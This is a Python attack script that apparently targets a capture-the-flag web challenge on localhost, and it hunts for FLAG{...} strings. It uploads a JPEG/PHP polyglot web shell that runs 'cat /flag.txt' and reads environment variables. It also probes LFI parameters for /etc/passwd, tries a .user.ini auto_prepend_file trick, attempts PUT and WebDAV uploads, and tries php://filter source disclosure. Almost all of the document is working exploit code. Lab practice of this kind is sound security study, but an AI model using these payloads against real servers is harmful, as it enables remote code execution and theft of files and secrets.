import requests

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Upload shell.jpg first
print("[*] TEST 1: Upload shell.jpg with PHP code")
shell_jpeg = jpeg_content + b'<?php echo file_get_contents("/flag.txt"); system("cat /flag.txt"); echo getenv("FLAG"); ?>'
files = {'userfile': ('shell.jpg', shell_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Test 2: Check if /flag.txt is accessible directly
print("\n[*] TEST 2: Try to access /flag.txt")
r = requests.get(f"{base_url}/flag.txt")
print(f"[+] /flag.txt: {r.status_code}")
if r.status_code == 200:
    print(f"[+] Content: {r.text}")

# Test 3: Check if we can read /etc/passwd via potential LFI
print("\n[*] TEST 3: Try LFI via potential parameters")
params_list = [
    {'file': '/etc/passwd'},
    {'path': '/etc/passwd'},
    {'page': '/etc/passwd'},
    {'img': '/etc/passwd'},
]
for params in params_list:
    r = requests.get(f"{base_url}/index.php", params=params)
    if 'root:' in r.text:
        print(f"[!!!] LFI FOUND with params: {params}")
        print(r.text[:500])

# Test 4: Try to upload .user.ini
print("\n[*] TEST 4: Try to upload .user.ini")
userini_jpeg = jpeg_content + b'\nauto_prepend_file=shell.jpg\n'
files = {'userfile': ('.user.ini', userini_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Check if .user.ini was uploaded
r = requests.get(f"{base_url}/upload/.user.ini")
if r.status_code == 200:
    print("[!!!] .user.ini EXISTS!")
    print(f"[+] Content: {r.text}")
    # Now access any PHP file to trigger auto_prepend
    r = requests.get(f"{base_url}/index.php")
    if 'FLAG' in r.text:
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"[!!!] FLAGS: {flags}")
else:
    print(f"[+] .user.ini: {r.status_code}")

# Test 5: Check if there's an existing PHP file in upload directory we can use
print("\n[*] TEST 5: Check existing PHP files in upload")
test_files = ['index.php', 'shell.php', 'test.php', 'info.php', 'config.php']
for f in test_files:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code != 404:
        print(f"[+] {f}: {r.status_code}")

# Test 6: Try alternative upload methods
print("\n[*] TEST 6: Try PUT method")
r = requests.put(f"{base_url}/upload/test_put.jpg", data=shell_jpeg)
print(f"[+] PUT: {r.status_code}")

if r.status_code in [200, 201, 204]:
    r = requests.get(f"{base_url}/upload/test_put.jpg")
    print(f"[+] GET after PUT: {r.status_code}")

# Test 7: Check for WebDAV
print("\n[*] TEST 7: Check for WebDAV")
r = requests.request('PROPFIND', f"{base_url}/upload/", headers={'Depth': '1'})
print(f"[+] PROPFIND: {r.status_code}")

# Test 8: Look for PHP wrappers
print("\n[*] TEST 8: Try PHP wrappers")
php_files = ['shell.jpg', 'exec.jpg', 'env.jpg']
for f in php_files:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code == 200:
        print(f"[+] {f}: {len(r.content)} bytes")

# Test 9: Check the source of index.php via base64
print("\n[*] TEST 9: Check for source disclosure")
r = requests.get(f"{base_url}/index.php", params={'file': 'php://filter/convert.base64-encode/resource=index.php'})
if 'PD9' in r.text:  # base64 of <?
    import base64
    # Try to extract base64 content
    import re
    b64_matches = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
    if b64_matches:
        decoded = base64.b64decode(b64_matches[0])
        print(f"[!!!] Source disclosure! Decoded: {decoded}")

# Test 10: Direct environment variable check
print("\n[*] TEST 10: Direct environment check via shell.jpg")
r = requests.get(f"{base_url}/upload/shell.jpg")
print(f"[+] shell.jpg raw content:")
print(r.text)

